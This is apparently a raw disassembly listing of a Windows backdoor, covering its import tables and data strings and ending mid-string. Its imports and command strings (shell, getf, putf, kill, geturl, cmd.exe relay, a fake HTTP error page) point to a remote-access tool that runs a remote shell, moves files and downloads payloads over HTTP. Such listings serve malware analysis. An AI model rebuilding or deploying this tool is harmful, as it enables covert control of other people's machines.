.idata:004030C0 extrn __getmainargs:dword
.idata:004030C4 ; void (__cdecl *_initterm)(_PVFV *First, _PVFV *Last)
.idata:004030C4 extrn __imp__initterm:dword
.idata:004030C8 ; void (__cdecl *_setusermatherr)(_UserMathErrorFunctionPointer UserMathErrorFunction)
.idata:004030C8 extrn __setusermatherr:dword
.idata:004030CC extrn _adjust_fdiv:dword
.idata:004030D0 ; int *(__cdecl *_p__commode)()
.idata:004030D0 extrn __p__commode:dword
.idata:004030D4 ; int *(__cdecl *_p__fmode)()
.idata:004030D4 extrn __p__fmode:dword
.idata:004030D8 ; void (__cdecl *_set_app_type)(_crt_app_type Type)
.idata:004030D8 extrn __set_app_type:dword
.idata:004030DC extrn __imp__except_handler3:dword
.idata:004030E0 ; unsigned int (__cdecl *_controlfp)(unsigned int NewValue, unsigned int Mask)
.idata:004030E0 extrn __imp__controlfp:dword
.idata:004030E4 ; __declspec(dllimport) void __cdecl operator delete(void *)
.idata:004030E4 extrn __imp_??3@YAXPAX@Z:dword
.idata:004030E8 ; size_t (__cdecl *strlen)(const char *Str)
.idata:004030E8 extrn __imp_strlen:dword
.idata:004030EC ; char *(__cdecl *strcpy)(char *Destination, const char *Source)
.idata:004030EC extrn __imp_strcpy:dword
.idata:004030F0 ; char *(__cdecl *strstr)(const char *Str, const char *SubStr)
.idata:004030F0 extrn strstr:dword
.idata:004030F4 ; __declspec(dllimport) void * __cdecl operator new(unsigned int)
.idata:004030F4 extrn __imp_??2@YAPAXI@Z:dword
.idata:004030F8 ; int (*sprintf)(char *const Buffer, const char *const Format, ...)
.idata:004030F8 extrn sprintf:dword
.idata:004030FC ; int (__cdecl *atoi)(const char *String)
.idata:004030FC extrn atoi:dword
.idata:00403100 ; int (__cdecl *strcmpi)(const char *String1, const char *String2)
.idata:00403100 extrn _strcmpi:dword
.idata:00403104 ; void *(__cdecl *memset)(void *, int Val, size_t Size)
.idata:00403104 extrn __imp_memset:dword
.idata:00403108 ; char *(__cdecl *strcat)(char *Destination, const char *Source)
.idata:00403108 extrn __imp_strcat:dword
.idata:0040310C extrn __imp___CxxFrameHandler:dword
.idata:00403110
.idata:00403114 ;
.idata:00403114 ; Imports from Secur32.dll
.idata:00403114 ;
.idata:00403114 ; BOOLEAN (__stdcall *GetUserNameExA)(EXTENDED_NAME_FORMAT NameFormat, LPSTR lpNameBuffer, PULONG nSize)
.idata:00403114 extrn __imp_GetUserNameExA:dword
.idata:00403118
.idata:0040311C ;
.idata:0040311C ; Imports from WININET.dll
.idata:0040311C ;
.idata:0040311C ; BOOL (__stdcall *HttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
.idata:0040311C extrn HttpSendRequestA:dword
.idata:00403120 ; BOOL (__stdcall *InternetQueryOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength)
.idata:00403120 extrn InternetQueryOptionA:dword
.idata:00403124 ; BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet)
.idata:00403124 extrn InternetCloseHandle:dword
.idata:00403128 ; HINTERNET (__stdcall *InternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
.idata:00403128 extrn InternetConnectA:dword
.idata:0040312C ; HINTERNET (__stdcall *HttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
.idata:0040312C extrn HttpOpenRequestA:dword
.idata:00403130 ; BOOL (__stdcall *HttpAddRequestHeadersA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers)
.idata:00403130 extrn HttpAddRequestHeadersA:dword
.idata:00403134 ; HINTERNET (__stdcall *InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
.idata:00403134 extrn InternetOpenA:dword
.idata:00403138 ; BOOL (__stdcall *InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
.idata:00403138 extrn InternetReadFile:dword
.idata:0040313C ; BOOL (__stdcall *InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength)
.idata:0040313C extrn InternetSetOptionA:dword
.idata:00403140
.idata:00403144 ;
.idata:00403144 ; Imports from urlmon.dll
.idata:00403144 ;
.idata:00403144 ; HRESULT (__stdcall *URLDownloadToFileA)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK)
.idata:00403144 extrn __imp_URLDownloadToFileA:dword
.idata:00403148
.idata:00403148
.rdata:0040314C
.rdata:0040314C ; Segment type: Pure data
.rdata:0040314C ; Segment permissions: Read
.rdata:0040314C _rdata segment para public 'DATA' use32
.rdata:0040314C assume cs:_rdata
.rdata:0040314C ;org 40314Ch
.rdata:0040314C align 10h
.rdata:00403150 off_403150 dd offset DeletingPtr
.rdata:00403154 align 8
.rdata:00403158 stru_403158 _SCOPETABLE_ENTRY <0FFFFFFFFh, \
.rdata:00403158                    offset loc_402BED, \
.rdata:00403158                    offset loc_402C01>
.rdata:00403164 align 8
.rdata:00403168 stru_403168 FuncInfoV1 <19930520h, 1, \
.rdata:00403168             offset stru_403188, 0, 0, 0,\
.rdata:00403168             0>
.rdata:00403184 db    0
.rdata:00403185 db    0
.rdata:00403186 db    0
.rdata:00403187 db    0
.rdata:00403188 stru_403188 UnwindMapEntry <-1, offset loc_402C48>
.rdata:00403190 stru_403190 FuncInfoV1 <19930520h, 1, \
.rdata:00403190             offset stru_4031B0, 0, 0, 0,\
.rdata:00403190             0>
.rdata:004031AC db    0
.rdata:004031AD db    0
.rdata:004031AE db    0
.rdata:004031AF db    0
.rdata:004031B0 stru_4031B0 UnwindMapEntry <-1, offset loc_402C5C>
.rdata:004031B8 __IMPORT_DESCRIPTOR_KERNEL32 dd rva off_403268 ; Import Name Table
.rdata:004031BC dd 0                    ; Time stamp
.rdata:004031C0 dd 0                    ; Forwarder Chain
.rdata:004031C4 dd rva aKernel32Dll     ; DLL Name
.rdata:004031C8 dd rva GetComputerNameA ; Import Address Table
.rdata:004031CC __IMPORT_DESCRIPTOR_MSVCRT dd rva off_4032E8 ; Import Name Table
.rdata:004031D0 dd 0                    ; Time stamp
.rdata:004031D4 dd 0                    ; Forwarder Chain
.rdata:004031D8 dd rva aMsvcrtDll       ; DLL Name
.rdata:004031DC dd rva atol             ; Import Address Table
.rdata:004031E0 __IMPORT_DESCRIPTOR_WININET dd rva off_403360 ; Import Name Table
.rdata:004031E4 dd 0                    ; Time stamp
.rdata:004031E8 dd 0                    ; Forwarder Chain
.rdata:004031EC dd rva aWininetDll      ; DLL Name
.rdata:004031F0 dd rva HttpSendRequestA ; Import Address Table
.rdata:004031F4 __IMPORT_DESCRIPTOR_ADVAPI32 dd rva off_403244 ; Import Name Table
.rdata:004031F8 dd 0                    ; Time stamp
.rdata:004031FC dd 0                    ; Forwarder Chain
.rdata:00403200 dd rva aAdvapi32Dll     ; DLL Name
.rdata:00403204 dd rva CreateProcessAsUserA ; Import Address Table
.rdata:00403208 __IMPORT_DESCRIPTOR_urlmon dd rva off_403388 ; Import Name Table
.rdata:0040320C dd 0                    ; Time stamp
.rdata:00403210 dd 0                    ; Forwarder Chain
.rdata:00403214 dd rva aUrlmonDll       ; DLL Name
.rdata:00403218 dd rva __imp_URLDownloadToFileA ; Import Address Table
.rdata:0040321C __IMPORT_DESCRIPTOR_Secur32 dd rva off_403358 ; Import Name Table
.rdata:00403220 dd 0                    ; Time stamp
.rdata:00403224 dd 0                    ; Forwarder Chain
.rdata:00403228 dd rva aSecur32Dll      ; DLL Name
.rdata:0040322C dd rva __imp_GetUserNameExA ; Import Address Table
.rdata:00403230 db    0
.rdata:00403231 db    0
.rdata:00403232 db    0
.rdata:00403233 db    0
.rdata:00403234 db    0
.rdata:00403235 db    0
.rdata:00403236 db    0
.rdata:00403237 db    0
.rdata:00403238 db    0
.rdata:00403239 db    0
.rdata:0040323A db    0
.rdata:0040323B db    0
.rdata:0040323C db    0
.rdata:0040323D db    0
.rdata:0040323E db    0
.rdata:0040323F db    0
.rdata:00403240 db    0
.rdata:00403241 db    0
.rdata:00403242 db    0
.rdata:00403243 db    0
.rdata:00403244 ;
.rdata:00403244 ; Import names for ADVAPI32.dll
.rdata:00403244 ;
.rdata:00403244 off_403244 dd rva word_4037DC
.rdata:00403248 dd rva word_403808
.rdata:0040324C dd rva word_40381E
.rdata:00403250 dd rva word_403836
.rdata:00403254 dd rva word_403848
.rdata:00403258 dd rva word_40385A
.rdata:0040325C dd rva word_40386A
.rdata:00403260 dd rva word_4037F4
.rdata:00403264 dd 0
.rdata:00403268 ;
.rdata:00403268 ; Import names for KERNEL32.dll
.rdata:00403268 ;
.rdata:00403268 off_403268 dd rva word_40342E
.rdata:0040326C dd rva word_403442
.rdata:00403270 dd rva word_40344E
.rdata:00403274 dd rva word_40345A
.rdata:00403278 dd rva word_40346A
.rdata:0040327C dd rva word_403480
.rdata:00403280 dd rva word_403492
.rdata:00403284 dd rva word_4034A0
.rdata:00403288 dd rva word_4034B6
.rdata:0040328C dd rva word_403426
.rdata:00403290 dd rva word_4034E8
.rdata:00403294 dd rva word_403500
.rdata:00403298 dd rva word_403510
.rdata:0040329C dd rva word_40351C
.rdata:004032A0 dd rva word_403530
.rdata:004032A4 dd rva word_403540
.rdata:004032A8 dd rva word_403552
.rdata:004032AC dd rva word_40356E
.rdata:004032B0 dd rva word_40357C
.rdata:004032B4 dd rva word_40358A
.rdata:004032B8 dd rva word_4038C8
.rdata:004032BC dd rva word_403418
.rdata:004032C0 dd rva word_403400
.rdata:004032C4 dd rva word_4033E8
.rdata:004032C8 dd rva word_4033D8
.rdata:004032CC dd rva word_4033C2
.rdata:004032D0 dd rva word_4033B4
.rdata:004032D4 dd rva word_4033A0
.rdata:004032D8 dd rva word_4034CC
.rdata:004032DC dd rva word_403390
.rdata:004032E0 dd rva word_4038DC
.rdata:004032E4 dd 0
.rdata:004032E8 ;
.rdata:004032E8 ; Import names for MSVCRT.dll
.rdata:004032E8 ;
.rdata:004032E8 off_4032E8 dd rva word_403626
.rdata:004032EC dd rva word_403638
.rdata:004032F0 dd rva word_403642
.rdata:004032F4 dd rva word_403658
.rdata:004032F8 dd rva word_403660
.rdata:004032FC dd rva word_40366E
.rdata:00403300 dd rva word_403676
.rdata:00403304 dd rva word_403680
.rdata:00403308 dd rva word_403690
.rdata:0040330C dd rva word_40369C
.rdata:00403310 dd rva word_4036B0
.rdata:00403314 dd rva word_4036C0
.rdata:00403318 dd rva word_4036D0
.rdata:0040331C dd rva word_4036DE
.rdata:00403320 dd rva word_4036F0
.rdata:00403324 dd rva word_403704
.rdata:00403328 dd rva word_4035AC
.rdata:0040332C dd rva word_4035BC
.rdata:00403330 dd rva word_4035C6
.rdata:00403334 dd rva word_40362E
.rdata:00403338 dd rva word_4035D0
.rdata:0040333C dd rva word_4035E0
.rdata:00403340 dd rva word_4035EA
.rdata:00403344 dd rva word_4035F2
.rdata:00403348 dd rva word_4035FE
.rdata:0040334C dd rva word_403608
.rdata:00403350 dd rva word_403612
.rdata:00403354 dd 0
.rdata:00403358 ;
.rdata:00403358 ; Import names for Secur32.dll
.rdata:00403358 ;
.rdata:00403358 off_403358 dd rva word_4038AA
.rdata:0040335C dd 0
.rdata:00403360 ;
.rdata:00403360 ; Import names for WININET.dll
.rdata:00403360 ;
.rdata:00403360 off_403360 dd rva word_403792
.rdata:00403364 dd rva word_40377A
.rdata:00403368 dd rva word_4037BA
.rdata:0040336C dd rva word_403740
.rdata:00403370 dd rva word_40372C
.rdata:00403374 dd rva word_403712
.rdata:00403378 dd rva word_40376A
.rdata:0040337C dd rva word_4037A6
.rdata:00403380 dd rva word_403754
.rdata:00403384 dd 0
.rdata:00403388 ;
.rdata:00403388 ; Import names for urlmon.dll
.rdata:00403388 ;
.rdata:00403388 off_403388 dd rva word_403888
.rdata:0040338C dd 0
.rdata:00403390 word_403390 dw 168h
.rdata:00403392 db 'GetLastError',0
.rdata:0040339F align 10h
.rdata:004033A0 word_4033A0 dw 346h
.rdata:004033A2 db 'TerminateProcess',0
.rdata:004033B3 align 4
.rdata:004033B4 word_4033B4 dw 31h
.rdata:004033B6 db 'CloseHandle',0
.rdata:004033C2 word_4033C2 dw 37Ah
.rdata:004033C4 db 'WaitForSingleObject',0
.rdata:004033D8 word_4033D8 dw 6Ch
.rdata:004033DA db 'CreateThread',0
.rdata:004033E7 align 4
.rdata:004033E8 word_4033E8 dw 2F7h
.rdata:004033EA db 'SetCurrentDirectoryA',0
.rdata:004033FF align 10h
.rdata:00403400 word_403400 dw 1E5h
.rdata:00403402 db 'GetWindowsDirectoryA',0
.rdata:00403417 align 4
.rdata:00403418 word_403418 dw 61h
.rdata:0040341A db 'CreatePipe',0
.rdata:00403425 align 2
.rdata:00403426 word_403426 dw 33Eh
.rdata:00403428 db 'Sleep',0
.rdata:0040342E word_40342E dw 10Dh
.rdata:00403430 db 'GetComputerNameA',0
.rdata:00403441 align 2
.rdata:00403442 word_403442 dw 38Bh
.rdata:00403444 db 'WriteFile',0
.rdata:0040344E word_40344E dw 2A3h
.rdata:00403450 db 'ReadFile',0
.rdata:00403459 align 2
.rdata:0040345A word_40345A dw 27Fh
.rdata:0040345C db 'PeekNamedPipe',0
.rdata:0040346A word_40346A dw 152h
.rdata:0040346C db 'GetExitCodeProcess',0
.rdata:0040347F align 10h
.rdata:00403480 word_403480 dw 62h
.rdata:00403482 db 'CreateProcessA',0
.rdata:00403491 align 2
.rdata:00403492 word_403492 dw 274h
.rdata:00403494 db 'OpenProcess',0
.rdata:004034A0 word_4034A0 dw 156h
.rdata:004034A2 db 'GetFileAttributesA',0
.rdata:004034B5 align 2
.rdata:004034B6 word_4034B6 dw 1B6h
.rdata:004034B8 db 'GetSystemDirectoryA',0
.rdata:004034CC word_4034CC dw 0B9h
.rdata:004034CE db 'ExpandEnvironmentStringsA',0
.rdata:004034E8 word_4034E8 dw 1DDh
.rdata:004034EA db 'GetVolumeInformationA',0
.rdata:00403500 word_403500 dw 14Bh
.rdata:00403502 db 'GetDriveTypeA',0
.rdata:00403510 word_403510 dw 3A4h
.rdata:00403512 db 'lstrcatA',0
.rdata:0040351B align 4
.rdata:0040351C word_40351C dw 16Fh
.rdata:0040351E db 'GetLogicalDrives',0
.rdata:0040352F align 10h
.rdata:00403530 word_403530 dw 286h
.rdata:00403532 db 'Process32Next',0
.rdata:00403540 word_403540 dw 284h
.rdata:00403542 db 'Process32First',0
.rdata:00403551 align 2
.rdata:00403552 word_403552 dw 6Fh
.rdata:00403554 db 'CreateToolhelp32Snapshot',0
.rdata:0040356D align 2
.rdata:0040356E word_40356E dw 15Bh
.rdata:00403570 db 'GetFileSize',0
.rdata:0040357C word_40357C dw 4Fh
.rdata:0040357E db 'CreateFileA',0
.rdata:0040358A word_40358A dw 13Bh
.rdata:0040358C db 'GetCurrentProcess',0
.rdata:0040359E aKernel32Dll db 'KERNEL32.dll',0
.rdata:004035AB align 4
.rdata:004035AC word_4035AC dw 10h
.rdata:004035AE db '??3@YAXPAX@Z',0
.rdata:004035BB align 4
.rdata:004035BC word_4035BC dw 2BEh
.rdata:004035BE db 'strlen',0
.rdata:004035C5 align 2
.rdata:004035C6 word_4035C6 dw 2BAh
.rdata:004035C8 db 'strcpy',0
.rdata:004035CF align 10h
.rdata:004035D0 word_4035D0 dw 0Fh
.rdata:004035D2 db '??2@YAPAXI@Z',0
.rdata:004035DF align 10h
.rdata:004035E0 word_4035E0 dw 2B2h
.rdata:004035E2 db 'sprintf',0
.rdata:004035EA word_4035EA dw 23Dh
.rdata:004035EC db 'atoi',0
.rdata:004035F1 align 2
.rdata:004035F2 word_4035F2 dw 1BDh
.rdata:004035F4 db '_strcmpi',0
.rdata:004035FD align 2
.rdata:004035FE word_4035FE dw 299h
.rdata:00403600 db 'memset',0
.rdata:00403607 align 4
.rdata:00403608 word_403608 dw 2B6h
.rdata:0040360A db 'strcat',0
.rdata:00403611 align 2
.rdata:00403612 word_403612 dw 49h
.rdata:00403614 db '__CxxFrameHandler',0
.rdata:00403626 word_403626 dw 23Eh
.rdata:00403628 db 'atol',0
.rdata:0040362D align 2
.rdata:0040362E word_40362E dw 2C5h
.rdata:00403630 db 'strstr',0
.rdata:00403637 align 4
.rdata:00403638 word_403638 dw 2B5h
.rdata:0040363A db 'sscanf',0
.rdata:00403641 align 2
.rdata:00403642 word_403642 dw 2C3h
.rdata:00403644 db 'strrchr',0
.rdata:0040364C aMsvcrtDll db 'MSVCRT.dll',0
.rdata:00403657 align 4
.rdata:00403658 word_403658 dw 0D3h
.rdata:0040365A db '_exit',0
.rdata:00403660 word_403660 dw 48h
.rdata:00403662 db '_XcptFilter',0
.rdata:0040366E word_40366E dw 249h
.rdata:00403670 db 'exit',0
.rdata:00403675 align 2
.rdata:00403676 word_403676 dw 8Fh
.rdata:00403678 db '_acmdln',0
.rdata:00403680 word_403680 dw 58h
.rdata:00403682 db '__getmainargs',0
.rdata:00403690 word_403690 dw 10Fh
.rdata:00403692 db '_initterm',0
.rdata:0040369C word_40369C dw 83h
.rdata:0040369E db '__setusermatherr',0
.rdata:004036AF align 10h
.rdata:004036B0 word_4036B0 dw 9Dh
.rdata:004036B2 db '_adjust_fdiv',0
.rdata:004036BF align 10h
.rdata:004036C0 word_4036C0 dw 6Ah
.rdata:004036C2 db '__p__commode',0
.rdata:004036CF align 10h
.rdata:004036D0 word_4036D0 dw 6Fh
.rdata:004036D2 db '__p__fmode',0
.rdata:004036DD align 2
.rdata:004036DE word_4036DE dw 81h
.rdata:004036E0 db '__set_app_type',0
.rdata:004036EF align 10h
.rdata:004036F0 word_4036F0 dw 0CAh
.rdata:004036F2 db '_except_handler3',0
.rdata:00403703 align 4
.rdata:00403704 word_403704 dw 0B7h
.rdata:00403706 db '_controlfp',0
.rdata:00403711 align 2
.rdata:00403712 word_403712 dw 50h
.rdata:00403714 db 'HttpAddRequestHeadersA',0
.rdata:0040372B align 4
.rdata:0040372C word_40372C dw 55h
.rdata:0040372E db 'HttpOpenRequestA',0
.rdata:0040373F align 10h
.rdata:00403740 word_403740 dw 6Fh
.rdata:00403742 db 'InternetConnectA',0
.rdata:00403753 align 4
.rdata:00403754 word_403754 dw 0A7h
.rdata:00403756 db 'InternetSetOptionA',0
.rdata:00403769 align 2
.rdata:0040376A word_40376A dw 92h
.rdata:0040376C db 'InternetOpenA',0
.rdata:0040377A word_40377A dw 98h
.rdata:0040377C db 'InternetQueryOptionA',0
.rdata:00403791 align 2
.rdata:00403792 word_403792 dw 59h
.rdata:00403794 db 'HttpSendRequestA',0
.rdata:004037A5 align 2
.rdata:004037A6 word_4037A6 dw 9Ah
.rdata:004037A8 db 'InternetReadFile',0
.rdata:004037B9 align 2
.rdata:004037BA word_4037BA dw 69h
.rdata:004037BC db 'InternetCloseHandle',0
.rdata:004037D0 aWininetDll db 'WININET.dll',0
.rdata:004037DC word_4037DC dw 5Fh
.rdata:004037DE db 'CreateProcessAsUserA',0
.rdata:004037F3 align 4
.rdata:004037F4 word_4037F4 dw 1AAh
.rdata:004037F6 db 'OpenProcessToken',0
.rdata:00403807 align 4
.rdata:00403808 word_403808 dw 3Eh
.rdata:0040380A db 'CloseServiceHandle',0
.rdata:0040381D align 2
.rdata:0040381E word_40381E dw 0D2h
.rdata:00403820 db 'EnumServicesStatusExA',0
.rdata:00403836 word_403836 dw 1ABh
.rdata:00403838 db 'OpenSCManagerA',0
.rdata:00403847 align 4
.rdata:00403848 word_403848 dw 42h
.rdata:0040384A db 'ControlService',0
.rdata:00403859 align 2
.rdata:0040385A word_40385A dw 1ADh
.rdata:0040385C db 'OpenServiceA',0
.rdata:00403869 align 2
.rdata:0040386A word_40386A dw 23Fh
.rdata:0040386C db 'StartServiceA',0
.rdata:0040387A aAdvapi32Dll db 'ADVAPI32.dll',0
.rdata:00403887 align 4
.rdata:00403888 word_403888 dw 48h
.rdata:0040388A db 'URLDownloadToFileA',0
.rdata:0040389D align 2
.rdata:0040389E aUrlmonDll db 'urlmon.dll',0
.rdata:004038A9 align 2
.rdata:004038AA word_4038AA dw 18h
.rdata:004038AC db 'GetUserNameExA',0
.rdata:004038BB align 4
.rdata:004038BC aSecur32Dll db 'Secur32.dll',0
.rdata:004038C8 word_4038C8 dw 175h
.rdata:004038CA db 'GetModuleHandleA',0
.rdata:004038DB align 4
.rdata:004038DC word_4038DC dw 1ACh
.rdata:004038DE db 'GetStartupInfoA',0
.rdata:004038EE align 800h
.rdata:004038EE _rdata ends
.rdata:004038EE
.data:00404000 ; Section 3. (virtual address 00004000)
.data:00404000 ; Virtual size                  : 000007C8 (   1992.)
.data:00404000 ; Section size in file          : 00000800 (   2048.)
.data:00404000 ; Offset to raw data for section: 00002C00
.data:00404000 ; Flags C0000040: Data Readable Writable
.data:00404000 ; Alignment     : default
.data:00404000
.data:00404000 ; Segment type: Pure data
.data:00404000 ; Segment permissions: Read/Write
.data:00404000 _data segment para public 'DATA' use32
.data:00404000 assume cs:_data
.data:00404000 ;org 404000h
.data:00404000 ; _PVFV dword_404000
.data:00404000 dword_404000 dd 0
.data:00404004 ; _PVFV dword_404004
.data:00404004 dword_404004 dd 0
.data:00404008 ; _PVFV First
.data:00404008 First dd 0
.data:0040400C ; _PVFV Last
.data:0040400C Last dd 0
.data:00404010 ; CHAR szVerb[4]
.data:00404010 szVerb db 'GET',0
.data:00404014 ; char Format[]
.data:00404014 Format db 'Content-Length: %d',0Dh,0Ah,0
.data:00404029 align 4
.data:0040402C ; char aShell[]
.data:0040402C aShell db 'shell',0
.data:00404032 align 4
.data:00404034 aList db 'list',0
.data:00404039 align 4
.data:0040403C aKill db 'kill',0
.data:00404041 align 4
.data:00404044 aGetf db 'getf',0
.data:00404049 align 4
.data:0040404C aPutf_0 db 'putf',0
.data:00404051 align 4
.data:00404054 aStart db 'start',0
.data:0040405A align 4
.data:0040405C aWhoami db 'whoami',0
.data:00404063 align 4
.data:00404064 aQuit db 'quit',0
.data:00404069 align 4
.data:0040406C aV db 'v',0
.data:0040406E db    0
.data:0040406F db    0
.data:00404070 db    0
.data:00404071 db    0
.data:00404072 db    0
.data:00404073 db    0
.data:00404074 db  70h ; p
.data:00404075 db  69h ; i
.data:00404076 db  64h ; d
.data:00404077 db  72h ; r
.data:00404078 db  75h ; u
.data:00404079 db  6Eh ; n
.data:0040407A db    0
.data:0040407B db    0
.data:0040407C db  67h ; g
.data:0040407D db  65h ; e
.data:0040407E db  74h ; t
.data:0040407F db  75h ; u
.data:00404080 db  72h ; r
.data:00404081 db  6Ch ; l
.data:00404082 db    0
.data:00404083 db    0
.data:00404084 ; char aSleepTime[]
.data:00404084 aSleepTime db 'Sleep Time:',0
.data:00404090 ; char aStartShellFirs[]
.data:00404090 aStartShellFirs db 'Start shell first.',0Dh,0Ah,0
.data:004040A5 align 4
.data:004040A8 a20111117 db '20111117',0Dh,0Ah,0
.data:004040B3 align 4
.data:004040B4 ; char asc_4040B4[]
.data:004040B4 asc_4040B4 db 0Dh,0Ah,0
.data:004040B7 align 4
.data:004040B8 ; char String1[]
.data:004040B8 String1 db '<h1>Bad Request (Invalid Hostname)<'
.data:004040B8 db '/h1>',0
.data:004040E0 ; char asc_4040E0[]
.data:004040E0 asc_4040E0 db '$',0
.data:004040E2 align 4
.data:004040E4 ; char aSConnected[]
.data:004040E4 aSConnected db 0Dh,0Ah
.data:004040E4 db '%s Connected!',0Dh,0Ah,0
.data:004040F6 align 4
.data:004040F8 ; char aTasks[]
.data:004040F8 aTasks db '\tasks',0
.data:004040FF align 10h
.data:00404100 ; char aComputer[]
.data:00404100 aComputer db 'Computer:',0
.data:0040410A align 4
.data:0040410C ; char Source[]
.data:0040410C Source db 'Accept:*/*',0Dh,0Ah
.data:0040410C db 'Pragma:no-cache',0Dh,0Ah
.data:0040410C db 'Cache-Control:max-age=0',0Dh,0Ah
.data:0040410C db 'Cache-Control:no-cache',0Dh,0Ah,0
.data:0040415B align 4
.data:0040415C ; char aProcessCmdExeE[]
.data:0040415C aProcessCmdExeE db 'Process cmd.exe exited!',0Dh,0Ah,0
.data:00404176 align 4
.data:00404178 ; char aAndThePidIsD[]
.data:00404178 aAndThePidIsD db ' and the PID is %d',0Dh,0Ah,0
.data:0040418D align 10h
.data:00404190 ; char aStartedAlready[]
.data:00404190 aStartedAlready db 'Started already,',0
.data:004041A1 align 4
.data:004041A4 aShellStartedFa db 'Shell started fail!',0Dh,0Ah,0
.data:004041BA align 4
.data:004041BC ; char aShellStartedSu[]
.data:004041BC aShellStartedSu db 'Shell started successfully!',0Dh,0Ah
.data:004041BC db 0
.data:004041DA align 4
.data:004041DC ; char aOpentFailedWit[]
.data:004041DC aOpentFailedWit db 'OpenT failed with %d!',0Ah,0
.data:004041F3 align 4
.data:004041F4 ; char aOpenpFailedWit[]
.data:004041F4 aOpenpFailedWit db 'OpenP failed with %d!',0Ah,0
.data:0040420B align 4
.data:0040420C ; char asc_40420C[]
.data:0040420C asc_40420C db 0Ah,0
.data:0040420E align 10h
.data:00404210 ; char aCmdpath[]
.data:00404210 aCmdpath db 0Ah
.data:00404210 db 'CmdPath=',0
.data:0040421A align 4
.data:0040421C ; char aGetfileattribu[]
.data:0040421C aGetfileattribu db 'GetFileAttributes Error code: %d',0Dh
.data:0040421C db 0Ah,0
.data:0040423F align 10h
.data:00404240 ; char aCmdExe[]
.data:00404240 aCmdExe db '\cmd.exe',0
.data:00404249 align 4
.data:0040424C ; CHAR Src[]
.data:0040424C Src db '%ComSpec%',0
.data:00404256 align 4
.data:00404258 ; char aTotallyDVolume[]
.data:00404258 aTotallyDVolume db 0Dh,0Ah
.data:00404258 db 'Totally %d volumes found.',0Dh,0Ah,0
.data:00404276 align 4
.data:00404278 ; char aUnkown[]
.data:00404278 aUnkown db 'Unkown',9,9,0
.data:00404281 align 4
.data:00404284 aInvalid db 'Invalid',9,9,0
.data:0040428E align 10h
.data:00404290 aRemoveable db 'Removeable',9,9,0
.data:0040429D align 10h
.data:004042A0 aFixed db 'Fixed',9,9,0
.data:004042A8 aRemote db 'Remote',9,9,0
.data:004042B1 align 4
.data:004042B4 aCdRom db 'CD-ROM',9,9,0
.data:004042BD align 10h
.data:004042C0 aRamdisk db 'Ramdisk',9,9,0
.data:004042CA align 4
.data:004042CC ; CHAR asc_4042CC[]
.data:004042CC asc_4042CC db ':\',0
.data:004042CF align 10h
.data:004042D0 ; char aC[]
.data:004042D0 aC db '%c:',9,0
.data:004042D5 align 4
.data:004042D8 ; char aVolumeOnThisCo[]
.data:004042D8 aVolumeOnThisCo db 'Volume on this computer:',0Dh,0Ah
.data:004042D8 db 'Volume',9,'Type',9,9,'Volume Name',0Dh
.data:004042D8 db 0Ah,0
.data:0040430D align 10h
.data:00404310 ; char aD[]
.data:00404310 aD db '/d',0
.data:00404313 align 4
.data:00404314 ; char a24sS[]
.data:00404314 a24sS db '%-24s %s',0Dh,0Ah,0
.data:0040431F align 10h
.data:00404320 ; char aListServiceFai[]
.data:00404320 aListServiceFai db 'list service failed!',0Dh,0Ah,0
.data:00404337 align 4
.data:00404338 ; char aS[]
.data:00404338 aS db '/s',0
.data:0040433B align 4
.data:0040433C ; char a26s5d[]
.data:0040433C a26s5d db '%-26s %5d',0Dh,0Ah,0
.data:00404348 aListProcessFai db 'list process failed!',0Dh,0Ah,0
.data:0040435F align 10h
.data:00404360 ; char aP[]
.data:00404360 aP db '/p',0
.data:00404363 align 4
.data:00404364 aSyntaxErrorUsa db 'Syntax error!',9,'Usage:',9,'list <'
.data:00404364 db '/p|/s|/d>',0Dh,0Ah,0
.data:0040438B align 4
.data:0040438C ; char aControlservice[]
.data:0040438C aControlservice db 0Dh,0Ah
.data:0040438C db 'ControlService failed!',0Dh,0Ah,0
.data:004043A7 align 4
.data:004043A8 aServiceDoesnTS db 0Dh,0Ah
.data:004043A8 db 'Service doesn',27h,'t start!',0Dh,0Ah
.data:004043A8 db 0
.data:004043C3 align 4
.data:004043C4 aServiceStopped db 0Dh,0Ah
.data:004043C4 db 'Service stopped!',0Dh,0Ah,0
.data:004043D9 align 4
.data:004043DC aServiceStopPen db 0Dh,0Ah
.data:004043DC db 'Service stop pending!',0Dh,0Ah,0
.data:004043F6 align 4
.data:004043F8 aServiceStillRu db 0Dh,0Ah
.data:004043F8 db 'Service still running!',0Dh,0Ah,0
.data:00404413 align 4
.data:00404414 ; char aOpenserviceFai[]
.data:00404414 aOpenserviceFai db 0Dh,0Ah
.data:00404414 db 'OpenService failed!',0Dh,0Ah,0
.data:0040442C aServiceDoesNot db 0Dh,0Ah
.data:0040442C db 'Service does not exist!',0Dh,0Ah,0
.data:00404448 ; char aOpenscmanagerF[]
.data:00404448 aOpenscmanagerF db 0Dh,0Ah
.data:00404448 db 'OpenSCManager failed!',0Dh,0Ah,0
.data:00404462 align 4
.data:00404464 aFailed db 0Dh,0Ah
.data:00404464 db 'Failed!',0Dh,0Ah,0
.data:00404470 ; char aOk[]
.data:00404470 aOk db 0Dh,0Ah
.data:00404470 db 'OK!',0Dh,0Ah,0
.data:00404478 aSyntaxErrorUsa_0 db 0Dh,0Ah
.data:00404478 db 'Syntax error!',9,'Usage:',9,'kill <'
